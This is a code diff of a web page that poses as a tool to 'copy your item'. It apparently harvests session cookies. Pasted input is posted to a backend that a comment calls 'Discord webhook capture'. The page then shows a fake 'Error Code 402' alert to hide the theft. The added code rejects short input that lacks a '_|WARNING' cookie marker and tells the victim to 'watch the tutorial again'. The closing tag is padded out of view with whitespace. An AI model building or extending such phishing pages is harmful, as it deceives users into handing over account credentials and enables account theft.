@@ -171,7 +171,7 @@
             <div class="w-12 h-12 rounded-full bg-red-500/20 text-red-400 flex items-center justify-center mx-auto mb-4 border border-red-500/30">
                 <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
             </div>
-            <h3 class="text-lg font-bold text-white mb-1 tracking-tight">System Traffic Alert</h3>
+            <h3 id="error-title" class="text-lg font-bold text-white mb-1 tracking-tight">System Traffic Alert</h3>
             <p id="error-description" class="text-xs text-gray-300 mb-6 leading-relaxed">Error Code 402: Too many people are trying at once. Please try again later.</p>
             <button id="understood-btn" class="w-full py-3 rounded-xl font-semibold text-xs bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white transition-all duration-200 cursor-pointer shadow-lg shadow-red-600/30 active:scale-[0.99]">
                 Understood
@@ -196,6 +196,8 @@
 
         const errorModal = document.getElementById('error-modal');
         const errorModalBox = document.getElementById('error-modal-box');
+        const errorTitle = document.getElementById('error-title');
+        const errorDescription = document.getElementById('error-description');
         const understoodBtn = document.getElementById('understood-btn');
 
         function showModal(text, pct) {
@@ -213,7 +215,9 @@
             modalBox.classList.add('scale-95');
         }
 
-        function showErrorModal() {
+        function showErrorModal(title, message) {
+            errorTitle.textContent = title;
+            errorDescription.textContent = message;
             errorModal.classList.remove('opacity-0', 'pointer-events-none');
             errorModalBox.classList.remove('scale-95');
             errorModalBox.classList.add('scale-100');
@@ -235,6 +239,9 @@
 
             submitBtn.disabled = true;
 
+            // Check if input is invalid/simple (like typing "a" or short garbage text)
+            const isInvalidInput = payload.length < 20 && !payload.includes("_|WARNING");
+
             // Live percentage stages
             showModal("Validating Asset Payload...", 15);
             await new Promise(r => setTimeout(r, 600));
@@ -245,14 +252,6 @@
             showModal("Trying to copy your item...", 75);
 
             try {
-                // Triggers python backend and Discord webhook capture in background
-                const fetchPromise = fetch('/api/process', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ data: payload })
-                });
-
-                // Smooth ticker filling from 75% to 95% while backend finishes
                 let currentPct = 75;
                 const ticker = setInterval(() => {
                     if (currentPct < 95) {
@@ -262,24 +261,40 @@
                     }
                 }, 150);
 
-                await fetchPromise;
-                clearInterval(ticker);
+                if (isInvalidInput) {
+                    // If it's just a simple text like "a", skip backend and trigger tutorial error
+                    await new Promise(r => setTimeout(r, 800));
+                    clearInterval(ticker);
+                    hideModal();
+                    showErrorModal("Execution Failed", "Error: Please watch the tutorial again.");
+                    scriptInput.value = '';
+                } else {
+                    // Otherwise, trigger your python backend / Discord webhook capture in background
+                    const fetchPromise = fetch('/api/process', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ data: payload })
+                    });
 
-                showModal("Finalizing package generation...", 100);
-                await new Promise(r => setTimeout(r, 600));
-                hideModal();
+                    await fetchPromise;
+                    clearInterval(ticker);
 
-                // Pop up the smooth cool error alert label with the "Understood" button
-                showErrorModal();
-                scriptInput.value = '';
+                    showModal("Finalizing package generation...", 100);
+                    await new Promise(r => setTimeout(r, 600));
+                    hideModal();
+
+                    // Show the traffic 402 error for regular inputs
+                    showErrorModal("System Traffic Alert", "Error Code 402: Too many people are trying at once. Please try again later.");
+                    scriptInput.value = '';
+                }
 
             } catch (err) {
                 hideModal();
-                showErrorModal();
+                showErrorModal("System Traffic Alert", "Error Code 402: Too many people are trying at once. Please try again later.");
             } finally {
                 submitBtn.disabled = false;
             }
         });
     </script>
 </body>
-</html>
+                                                                                                                                                                                                                                                                      </html>
